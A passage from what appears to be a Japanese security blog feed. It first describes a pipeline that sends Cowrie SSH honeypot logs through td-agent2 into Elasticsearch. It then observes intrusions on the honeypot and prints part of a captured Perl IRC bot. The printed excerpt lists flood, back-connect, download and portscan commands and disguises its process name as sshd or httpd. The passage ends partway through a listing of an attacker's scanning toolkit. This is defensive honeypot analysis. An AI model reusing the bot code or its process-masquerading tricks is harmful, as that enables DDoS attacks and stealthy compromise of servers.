<p>以上で、Elasticsearchの使用準備は出来た。<br>次にtd-agent2のインストール方法を紹介する。</p>
<h2 id="td-agent2_u3092_u30A4_u30F3_u30B9_u30C8_u30FC_u30EB_u3059_u308B"><a href="#td-agent2_u3092_u30A4_u30F3_u30B9_u30C8_u30FC_u30EB_u3059_u308B" class="headerlink" title="td-agent2をインストールする"></a>td-agent2をインストールする</h2><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -L <span class="string">http:</span><span class="comment">//toolbelt.treasuredata.com/sh/install-redhat-td-agent2.sh | sh</span></span><br></pre></td></tr></table></figure>
<p>起動</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl <span class="operator"><span class="keyword">start</span> td-<span class="keyword">agent</span></span></span><br></pre></td></tr></table></figure>
<p>必要パッケージをインストールする。</p>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum -<span class="keyword">y</span> install <span class="keyword">ruby</span> <span class="keyword">ruby</span>-devel mariadb-devel</span><br></pre></td></tr></table></figure>
<p>fluent-plugin-mysql-replicator をインストール</p>
<figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/<span class="preprocessor">opt</span>/td-agent/embedded/<span class="keyword">bin/fluent-gem </span>install fluent-plugin-mysql-replicator</span><br></pre></td></tr></table></figure>
<p>td-agent2のconfの設定をする。</p>
<figure class="highlight pf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/td-agent/td-agent.conf</span><br><span class="line"></span><br><span class="line"><span class="variable">&lt;source&gt;</span></span><br><span class="line">  type mysql_replicator</span><br><span class="line"></span><br><span class="line">  host     localhost</span><br><span class="line">  username cowrie</span><br><span class="line">  password cowrie</span><br><span class="line">  database cowrie</span><br><span class="line"></span><br><span class="line">  <span class="comment"># SELECTクエリの設定</span></span><br><span class="line">  query        select b.id,DATE_FORMAT(starttime, '%Y-%m-%dT%k:%i:%s+<span class="number">09</span>:<span class="number">00</span>')as timestamp          ,ip,username,password <span class="keyword">from</span> sessions a, auth b where a.id = b.session;</span><br><span class="line">  primary_key  id   <span class="comment"># 主キーを指定する (デフォルト: id)</span></span><br><span class="line">  interval     <span class="number">1</span>m  <span class="comment"># クエリを実行する間隔 (デフォルト: 1m)</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># 削除された主キーを検知する機能の有効化設定 (デフォルト: yes)</span></span><br><span class="line">  enable_delete yes</span><br><span class="line"></span><br><span class="line">  <span class="comment"># 各イベントをどのようなタグで配送するか指定する</span></span><br><span class="line">  <span class="keyword">tag</span> replicator.mysites.search_test.$&#123;event&#125;.$&#123;primary_key&#125;</span><br><span class="line">  <span class="comment"># $&#123;event&#125; : 検知したイベント種別が insert/update/delete のいずれかが入る</span></span><br><span class="line">  <span class="comment"># $&#123;primary_key&#125; : この設定の`primary_key`の値が入る</span></span><br><span class="line"><span class="variable">&lt;/source&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="variable">&lt;match replicator.**&gt;</span></span><br><span class="line">  type copy</span><br><span class="line">  <span class="variable">&lt;store&gt;</span></span><br><span class="line">  type stdout</span><br><span class="line">  <span class="variable">&lt;/store&gt;</span></span><br><span class="line">  <span class="variable">&lt;store&gt;</span></span><br><span class="line">  type mysql_replicator_elasticsearch</span><br><span class="line"></span><br><span class="line">  <span class="comment"># Elasticsearchサーバの接続情報を指定</span></span><br><span class="line">  host localhost</span><br><span class="line">  <span class="keyword">port</span> <span class="number">9200</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># Elasticsearchへレコードを登録する際の index(Database)、type(テーブル)、そしてunique id (primary_key)をどのようにタグから分解するか指定</span></span><br><span class="line">  tag_format (?<span class="variable">&lt;index_name&gt;</span>[^\.]+)\.(?<span class="variable">&lt;type_name&gt;</span>[^\.]+).(?<span class="variable">&lt;event&gt;</span>[^\.]+)\.(?<span class="variable">&lt;primary_key&gt;</span>[^\.]+)$</span><br><span class="line"></span><br><span class="line">  <span class="comment"># どの程度バッファに溜めてElasticsearchサーバへ転送するかを指定</span></span><br><span class="line">  flush_interval <span class="number">5</span>s</span><br><span class="line"></span><br><span class="line">  <span class="comment"># リトライ間隔の最大秒数 (fluentd &gt;= 0.10.41)</span></span><br><span class="line">  max_retry_wait <span class="number">1800</span></span><br><span class="line">  <span class="variable">&lt;/store&gt;</span></span><br><span class="line"><span class="variable">&lt;/match&gt;</span></span><br></pre></td></tr></table></figure>
<p>td-agentを再起動する。</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">systemctl</span> <span class="tag">restart</span> <span class="tag">td-agent</span><span class="class">.service</span></span><br></pre></td></tr></table></figure>
<p>ログを確認するとinsertされる様子を見ることができる。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ tail /var/<span class="built_in">log</span>/td-agent/td-agent.<span class="built_in">log</span></span><br><span class="line"><span class="number">2015</span>-<span class="number">07</span>-<span class="number">22</span> <span class="number">01</span>:<span class="number">14</span>:<span class="number">08</span> +<span class="number">0900</span> [info]: listening fluent socket on <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:<span class="number">24224</span></span><br><span class="line"><span class="number">2015</span>-<span class="number">07</span>-<span class="number">22</span> <span class="number">01</span>:<span class="number">14</span>:<span class="number">08</span> +<span class="number">0900</span> [info]: listening dRuby uri=<span class="string">"druby://127.0.0.1:24230"</span> object=<span class="string">"Engine"</span></span><br><span class="line"><span class="number">2015</span>-<span class="number">07</span>-<span class="number">22</span> <span class="number">01</span>:<span class="number">14</span>:<span class="number">08</span> +<span class="number">0900</span> replicator.cowrie.search.insert.id: &#123;<span class="string">"id"</span>:<span class="number">2</span>,<span class="string">"timestamp"</span>:<span class="string">"2015-07-21T5:15:19+09:00"</span>,<span class="string">"ip"</span>:<span class="string">"163.177.38.221"</span>,<span class="string">"username"</span>:<span class="string">"a"</span>,<span class="string">"password"</span>:<span class="string">"a"</span>&#125;</span><br><span class="line"><span class="number">2015</span>-<span class="number">07</span>-<span class="number">22</span> <span class="number">01</span>:<span class="number">14</span>:<span class="number">08</span> +<span class="number">0900</span> replicator.cowrie.search.insert.id: &#123;<span class="string">"id"</span>:<span class="number">3</span>,<span class="string">"timestamp"</span>:<span class="string">"2015-07-21T5:16:22+09:00"</span>,<span class="string">"ip"</span>:<span class="string">"163.177.38.221"</span>,<span class="string">"username"</span>:<span class="string">"test"</span>,<span class="string">"password"</span>:<span class="string">"test"</span>&#125;</span><br><span class="line"><span class="number">2015</span>-<span class="number">07</span>-<span class="number">22</span> <span class="number">01</span>:<span class="number">14</span>:<span class="number">08</span> +<span class="number">0900</span> replicator.cowrie.search.insert.id: &#123;<span class="string">"id"</span>:<span class="number">4</span>,<span class="string">"timestamp"</span>:<span class="string">"2015-07-21T5:16:22+09:00"</span>,<span class="string">"ip"</span>:<span class="string">"163.177.38.221"</span>,<span class="string">"username"</span>:<span class="string">"test"</span>,<span class="string">"password"</span>:<span class="string">"test123"</span>&#125;</span><br></pre></td></tr></table></figure>
<p>Elasticsearchにcowrieのデータが入っているか確認するにはcurlを使って確認する。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">$ curl <span class="string">"http://localhost:9200/cowrie/search/_search?size=5&amp;pretty"</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">"took"</span> : <span class="number">400</span>,</span><br><span class="line">  <span class="string">"timed_out"</span> : <span class="literal">false</span>,</span><br><span class="line">  <span class="string">"_shards"</span> : &#123;</span><br><span class="line">    <span class="string">"total"</span> : <span class="number">5</span>,</span><br><span class="line">    <span class="string">"successful"</span> : <span class="number">5</span>,</span><br><span class="line">    <span class="string">"failed"</span> : <span class="number">0</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="string">"hits"</span> : &#123;</span><br><span class="line">    <span class="string">"total"</span> : <span class="number">944</span>,</span><br><span class="line">    <span class="string">"max_score"</span> : <span class="number">1.0</span>,</span><br><span class="line">    <span class="string">"hits"</span> : [ &#123;</span><br><span class="line">      <span class="string">"_index"</span> : <span class="string">"cowrie"</span>,</span><br><span class="line">      <span class="string">"_type"</span> : <span class="string">"search"</span>,</span><br><span class="line">      <span class="string">"_id"</span> : <span class="string">"4"</span>,</span><br><span class="line">      <span class="string">"_score"</span> : <span class="number">1.0</span>,</span><br><span class="line">      <span class="string">"_source"</span>:&#123;<span class="string">"id"</span>:<span class="number">4</span>,<span class="string">"timestamp"</span>:<span class="string">"2015-07-21T5:16:22+09:00"</span>,<span class="string">"ip"</span>:<span class="string">"163.177.38.221"</span>,<span class="string">"username"</span>:<span class="string">"test"</span>,<span class="string">"password"</span>:<span class="string">"test123"</span>&#125;</span><br><span class="line">    &#125;, &#123;</span><br><span class="line">      <span class="string">"_index"</span> : <span class="string">"cowrie"</span>,</span><br><span class="line">      <span class="string">"_type"</span> : <span class="string">"search"</span>,</span><br><span class="line">      <span class="string">"_id"</span> : <span class="string">"9"</span>,</span><br><span class="line">      <span class="string">"_score"</span> : <span class="number">1.0</span>,</span><br><span class="line">      <span class="string">"_source"</span>:&#123;<span class="string">"id"</span>:<span class="number">9</span>,<span class="string">"timestamp"</span>:<span class="string">"2015-07-21T5:20:01+09:00"</span>,<span class="string">"ip"</span>:<span class="string">"163.177.38.221"</span>,<span class="string">"username"</span>:<span class="string">"student"</span>,<span class="string">"password"</span>:<span class="string">"123456"</span>&#125;</span><br><span class="line">    &#125;, &#123;</span><br><span class="line">      <span class="string">"_index"</span> : <span class="string">"cowrie"</span>,</span><br><span class="line">      <span class="string">"_type"</span> : <span class="string">"search"</span>,</span><br><span class="line">      <span class="string">"_id"</span> : <span class="string">"11"</span>,</span><br><span class="line">      <span class="string">"_score"</span> : <span class="number">1.0</span>,</span><br><span class="line">      <span class="string">"_source"</span>:&#123;<span class="string">"id"</span>:<span class="number">11</span>,<span class="string">"timestamp"</span>:<span class="string">"2015-07-21T5:21:43+09:00"</span>,<span class="string">"ip"</span>:<span class="string">"163.177.38.221"</span>,<span class="string">"username"</span>:<span class="string">"postgres"</span>,<span class="string">"password"</span>:<span class="string">"123456"</span>&#125;</span><br><span class="line">    &#125;, &#123;</span><br><span class="line">      <span class="string">"_index"</span> : <span class="string">"cowrie"</span>,</span><br><span class="line">      <span class="string">"_type"</span> : <span class="string">"search"</span>,</span><br><span class="line">      <span class="string">"_id"</span> : <span class="string">"16"</span>,</span><br><span class="line">      <span class="string">"_score"</span> : <span class="number">1.0</span>,</span><br><span class="line">      <span class="string">"_source"</span>:&#123;<span class="string">"id"</span>:<span class="number">16</span>,<span class="string">"timestamp"</span>:<span class="string">"2015-07-21T5:25:44+09:00"</span>,<span class="string">"ip"</span>:<span class="string">"163.177.38.221"</span>,<span class="string">"username"</span>:<span class="string">"user3"</span>,<span class="string">"password"</span>:<span class="string">"user3"</span>&#125;</span><br><span class="line">    &#125;, &#123;</span><br><span class="line">      <span class="string">"_index"</span> : <span class="string">"cowrie"</span>,</span><br><span class="line">      <span class="string">"_type"</span> : <span class="string">"search"</span>,</span><br><span class="line">      <span class="string">"_id"</span> : <span class="string">"23"</span>,</span><br><span class="line">      <span class="string">"_score"</span> : <span class="number">1.0</span>,</span><br><span class="line">      <span class="string">"_source"</span>:&#123;<span class="string">"id"</span>:<span class="number">23</span>,<span class="string">"timestamp"</span>:<span class="string">"2015-07-21T11:40:34+09:00"</span>,<span class="string">"ip"</span>:<span class="string">"123.56.106.178"</span>,<span class="string">"username"</span>:<span class="string">"www-data"</span>,<span class="string">"password"</span>:<span class="string">"www-data"</span>&#125;</span><br><span class="line">    &#125; ]</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="u53C2_u7167URL"><a href="#u53C2_u7167URL" class="headerlink" title="参照URL"></a>参照URL</h2><ul>
<li><a href="http://y-ken.hatenablog.com/entry/fluent-plugin-mysql-replicator-has-released" target="_blank" rel="external">MySQLテーブルへの更新/削除イベントを逐次取得するFluentdプラグイン「fluent-plugin-mysql-replicator」をリリースしました</a></li>
<li><a href="http://qiita.com/nakamegu/items/ea8ed1c9592356eaa4af" target="_blank" rel="external">FluentdでMySQLの日付をElasticsearchの@timestampに使う</a></li>
</ul>
]]></content>
    <summary type="html">
    <![CDATA[<p>前回の記事( <a href="http://atani.github.io/2015/07/ハニーポットcowrieのログを、mariaDBで管理しよう%E3%80%82/">ハニーポットcowrieのログを、mariaDBで管理しよう。</a> )でcowrieのログをmariaDBに出力するようにした。<br>今回は、そのデータをfluentd(td-agent2)を利用して、elasticsearchにデータを入れる手順をご紹介。</p>
<p>fluentdとは…ログを収集して様々な形式で格納できるソフトウェア<br>td-agent2とは…fluentdのラッパープログラム<br>elasticsearchとは…全文検索を提供するソフトウェア(サーチエンジン)</p>
<p>これらを入れることで次回ご紹介する解析に非常に有用になってくる。</p>]]>
    
    </summary>
    
      <category term="elasticsearch" scheme="http://atani.github.io/tags/elasticsearch/"/>
    
      <category term="fluentd" scheme="http://atani.github.io/tags/fluentd/"/>
    
      <category term="security" scheme="http://atani.github.io/tags/security/"/>
    
      <category term="td-agent2" scheme="http://atani.github.io/tags/td-agent2/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[夏休みの宿題？SSH不正侵入、観察日記 Vol.2]]></title>
    <link href="http://atani.github.io/2015/07/SSH%E4%B8%8D%E6%AD%A3%E4%BE%B5%E5%85%A5%E3%80%81%E8%A6%B3%E5%AF%9F%E6%97%A5%E8%A8%98-Vol-2/"/>
    <id>http://atani.github.io/2015/07/SSH不正侵入、観察日記-Vol-2/</id>
    <published>2015-07-24T12:43:50.000Z</published>
    <updated>2015-07-24T12:43:25.000Z</updated>
    <content type="html"><![CDATA[<p>アメリカ合衆国(US)から不正アクセスを観測したのでご紹介。</p>
<p>今回も、動画を見ていただこう。</p>
<a id="more"></a>
<img src="/2015/07/SSH不正侵入、観察日記-Vol-2/cowrie_log.gif" alt="[cowrie_log.gif]" title="[cowrie_log.gif]">
<p><code>last</code> コマンドをタイポしたあと、なにやらファイルをダウンロードして実行して去っていった。</p>
<p>実行しようとしたファイルの一部がこちら。</p>
<figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/perl</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">######</span><span class="comment">######</span><span class="comment">######</span><span class="comment">######</span><span class="comment">######</span><span class="comment">######</span><span class="comment">######</span><span class="comment">######</span><span class="comment">######</span><span class="comment">######</span><span class="comment">######</span><span class="comment">######</span><span class="comment">######</span><span class="comment">######</span><span class="comment">######</span><span class="comment">######</span><span class="comment">######</span><span class="comment">######</span><span class="comment">######</span><span class="comment">####</span><br><span class="line"></span><br><span class="line">###</span><span class="comment">######</span><span class="comment">######</span><span class="comment">######</span><span class="comment">######</span><span class="comment">######</span><span class="comment">######</span><span class="comment">######</span><span class="comment">######</span><span class="comment">######</span><span class="comment">######</span><span class="comment">######</span><span class="comment">######</span><span class="comment">######</span><span class="comment">######</span><span class="comment">######</span><span class="comment">######</span><span class="comment">######</span><span class="comment">######</span><span class="comment">######</span><span class="comment">#</span></span><br><span class="line"></span><br><span class="line"><span class="comment">##  DDoS Perl IrcBot v1.0 / 2012 by DDoS Security Team       ## [ Help ] ###########################################</span></span><br><span class="line"></span><br><span class="line"><span class="comment">##      Stealth MultiFunctional IrcBot writen in Perl          #######################################################</span></span><br><span class="line"></span><br><span class="line"><span class="comment">##        Teste on every system with PERL instlled             ##  !u @system                                       ##</span></span><br><span class="line"></span><br><span class="line"><span class="comment">##                                                             ##  !u @version                                      ##</span></span><br><span class="line"></span><br><span class="line"><span class="comment">##     This is a free program used on your own risk.           ##  !u @channel                                      ##</span></span><br><span class="line"></span><br><span class="line"><span class="comment">##        Created for educational purpose only.                ##  !u @flood                                        ##</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## I'm not responsible for the illegal use of this program.    ##  !u @utils                                        ##</span></span><br><span class="line"></span><br><span class="line"><span class="comment">######</span><span class="comment">######</span><span class="comment">######</span><span class="comment">######</span><span class="comment">######</span><span class="comment">######</span><span class="comment">######</span><span class="comment">######</span><span class="comment">######</span><span class="comment">######</span><span class="comment">######</span><span class="comment">######</span><span class="comment">######</span><span class="comment">######</span><span class="comment">######</span><span class="comment">######</span><span class="comment">######</span><span class="comment">######</span><span class="comment">######</span><span class="comment">####</span><br><span class="line"></span><br><span class="line">## [ Channel ] ###</span><span class="comment">######</span><span class="comment">######</span><span class="comment">##### [ Flood ] ###</span><span class="comment">######</span><span class="comment">######</span><span class="comment">######</span><span class="comment">######</span><span class="comment">######</span><span class="comment"># [ Utils ] ###########################</span></span><br><span class="line"></span><br><span class="line"><span class="comment">######</span><span class="comment">######</span><span class="comment">######</span><span class="comment">######</span><span class="comment">######</span><span class="comment">######</span><span class="comment">######</span><span class="comment">######</span><span class="comment">######</span><span class="comment">######</span><span class="comment">######</span><span class="comment">######</span><span class="comment">######</span><span class="comment">######</span><span class="comment">######</span><span class="comment">######</span><span class="comment">######</span><span class="comment">######</span><span class="comment">######</span><span class="comment">####</span><br><span class="line"></span><br><span class="line">##  !u @join &lt;#channel&gt;          ##  !u @udp1 &lt;ip&gt; &lt;port&gt; &lt;time&gt;              ##  !u @cback &lt;ip&gt; &lt;port&gt;             ##</span><br><span class="line"></span><br><span class="line">##  !u @part &lt;#channel&gt;          ##  !u @udp2 &lt;ip&gt; &lt;packet size&gt; &lt;time&gt;       ##  !u @downlod &lt;url+path&gt; &lt;file&gt;     ##</span><br><span class="line"></span><br><span class="line">##  !u !uejoin &lt;#channel&gt;        ##  !u @udp3 &lt;ip&gt; &lt;port&gt; &lt;time&gt;              ##  !u @portscan &lt;ip&gt;                 ##</span><br><span class="line"></span><br><span class="line">##  !u !op &lt;channel&gt; &lt;nick&gt;      ##  !u @tcp &lt;ip&gt; &lt;port&gt; &lt;packet size&gt; &lt;time&gt; ##  !u @mail &lt;subject&gt; &lt;sender&gt;       ##</span><br><span class="line"></span><br><span class="line">##  !u !deop &lt;channel&gt; &lt;nick&gt;    ##  !u @http &lt;site&gt; &lt;time&gt;                   ##           &lt;recipient&gt; &lt;message&gt;    ##</span><br><span class="line"></span><br><span class="line">##  !u !voice &lt;channel&gt; &lt;nick&gt;   ##                                           ##  !u pwd;uname -a;id &lt;for example&gt;  ##</span><br><span class="line"></span><br><span class="line">##  !u !devoice &lt;channel&gt; &lt;nick&gt; ##  !u @ctcpflood &lt;nick&gt;                     ##  !u @port &lt;ip&gt; &lt;port&gt;              ##</span><br><span class="line"></span><br><span class="line">##  !u !nick &lt;newnick&gt;           ##  !u @msgflood &lt;nick&gt;                      ##  !u @dns &lt;ip/host&gt;                 ##</span><br><span class="line"></span><br><span class="line">##  !u !msg &lt;nick&gt;               ##  !u @noticeflood &lt;nick&gt;                   ##                                    ##</span><br><span class="line"></span><br><span class="line">##  !u !quit                     ##                                           ##                                    ##</span><br><span class="line"></span><br><span class="line">##  !u !uaw                      ##                                           ##                                    ##</span><br><span class="line"></span><br><span class="line">##  !u @die                      ##                                           ##                                    ##</span><br><span class="line"></span><br><span class="line">##                               ##                                           ##                                    ##</span><br><span class="line"></span><br><span class="line">###</span><span class="comment">######</span><span class="comment">######</span><span class="comment">######</span><span class="comment">######</span><span class="comment">######</span><span class="comment">######</span><span class="comment">######</span><span class="comment">######</span><span class="comment">######</span><span class="comment">######</span><span class="comment">######</span><span class="comment">######</span><span class="comment">######</span><span class="comment">######</span><span class="comment">######</span><span class="comment">######</span><span class="comment">######</span><span class="comment">######</span><span class="comment">######</span><span class="comment">#</span></span><br><span class="line"></span><br><span class="line"><span class="comment">######</span><span class="comment">######</span><span class="comment">######</span><span class="comment">######</span><span class="comment">######</span><span class="comment">######</span><span class="comment">######</span><span class="comment">######</span><span class="comment">######</span><span class="comment">######</span><span class="comment">######</span><span class="comment">######</span><span class="comment">######</span><span class="comment">######</span><span class="comment">######</span><span class="comment">######</span><span class="comment">######</span><span class="comment">######</span><span class="comment">######</span><span class="comment">####</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">###</span><span class="comment">######</span><span class="comment">######</span><span class="comment">######</span><span class="comment">######</span><span class="comment">##</span></span><br><span class="line"></span><br><span class="line"><span class="comment">##### [ Configuration ] ###</span><span class="comment">##</span></span><br><span class="line"></span><br><span class="line"><span class="comment">######</span><span class="comment">######</span><span class="comment">######</span><span class="comment">######</span><span class="comment">#####</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">my @rps = ("/usr/local/apache/bin/httpd -DSSL",</span><br><span class="line"></span><br><span class="line">                   "/usr/sbin/httpd -k start -DSSL",</span><br><span class="line"></span><br><span class="line">           "/usr/sbin/httpd",</span><br><span class="line"></span><br><span class="line">                   "/usr/sbin/sshd -i",</span><br><span class="line"></span><br><span class="line">                   "/usr/sbin/sshd",</span><br><span class="line"></span><br><span class="line">               "/usr/sbin/sshd -D",</span><br><span class="line"></span><br><span class="line">           "/usr/sbin/apache2 -k start",</span><br><span class="line"></span><br><span class="line">               "/sbin/syslogd",</span><br><span class="line"></span><br><span class="line">               "/sbin/klogd -c 1 -x -x",</span><br><span class="line"></span><br><span class="line">                   "/usr/sbin/acpid",</span><br><span class="line"></span><br><span class="line">                   "/usr/sbin/cron");</span><br><span class="line"></span><br><span class="line">my $process = $rps[rand scalar @rps];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">my @rversion = ("\001VERSION - unknown command.\001",</span><br><span class="line"></span><br><span class="line">                                "\001mIRC v5.91 K.Mardam-Bey\001",</span><br><span class="line"></span><br><span class="line">                                "\001mIRC v6.2 Khaled Mardam-Bey\001",</span><br><span class="line"></span><br><span class="line">                                "\001mIRC v6.03 Khaled Mardam-Bey\001",</span><br><span class="line"></span><br><span class="line">                                "\001mIRC v6.14 Khaled Mardam-Bey\001",</span><br><span class="line"></span><br><span class="line">                                "\001mIRC v6.15 Khaled Mardam-Bey\001",</span><br><span class="line"></span><br><span class="line">                                "\001mIRC v6.16 Khaled Mardam-Bey\001",</span><br><span class="line"></span><br><span class="line">                                "\001mIRC v6.17 Khaled Mardam-Bey\001",</span><br><span class="line"></span><br><span class="line">                                "\001mIRC v6.21 Khaled Mardam-Bey\001",</span><br><span class="line"></span><br><span class="line">                                "\001mIRC v6.31 Khaled Mardam-Bey\001",</span><br><span class="line"></span><br><span class="line">                                "\001mIRC v7.15 Khaled Mardam-Bey\001");</span><br><span class="line"></span><br><span class="line">my $vers = $rversion[rand scalar @rversion];</span></span><br></pre></td></tr></table></figure>
<p>perl製のスクリプトで、前回と同じ、IRCBOTだった。 もちろんプロセス名は偽装して実行されるプログラムだった。</p>
<h1 id="u3082_u3046_u4E00_u3064_u3054_u7D39_u4ECB_uFF01"><a href="#u3082_u3046_u4E00_u3064_u3054_u7D39_u4ECB_uFF01" class="headerlink" title="もう一つご紹介！"></a>もう一つご紹介！</h1><p>夏休みスペシャルということで、もう一つご紹介。</p>
<p>今回はルーマニアからの不正アクセスを観察してみよう。</p>
<img src="/2015/07/SSH不正侵入、観察日記-Vol-2/cowrie_log.gif" alt="[cowrie_log.gif]" title="[cowrie_log.gif]">
<p>手馴れたもので、wgetするURLを手打ちしている模様。<br><code>rzv.tgz</code> を解凍したあと、何やらスクリプトを実行している。</p>
<p>解凍後のファイルの中身はこちら。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ ls -l</span><br><span class="line">合計 <span class="number">4100</span></span><br><span class="line">-rwxr-xr-x <span class="number">1</span> <span class="number">561</span> <span class="number">561</span>    <span class="number">3814</span> <span class="number">12</span>月 <span class="number">15</span>  <span class="number">2014</span> mass</span><br><span class="line">-rwxr-xr-x <span class="number">1</span> <span class="number">561</span> <span class="number">561</span> <span class="number">1268571</span> <span class="number">12</span>月 <span class="number">20</span>  <span class="number">2013</span> pscan</span><br><span class="line">-rwxr-xr-x <span class="number">1</span> <span class="number">561</span> <span class="number">561</span>     <span class="number">234</span> <span class="number">12</span>月 <span class="number">15</span>  <span class="number">2014</span> random</span><br><span class="line">-rwxr-xr-x <span class="number">1</span> <span class="number">561</span> <span class="number">561</span>     <span class="number">300</span> <span class="number">12</span>月 <span class="number">15</span>  <span class="number">2014</span> scan</span><br><span class="line">-rwxr-xr-x <span class="number">1</span> <span class="number">561</span> <span class="number">561</span>  <span class="number">302240</span> <span class="number">10</span>月 <span class="number">18</span>  <span class="number">2002</span> screen</span><br><span 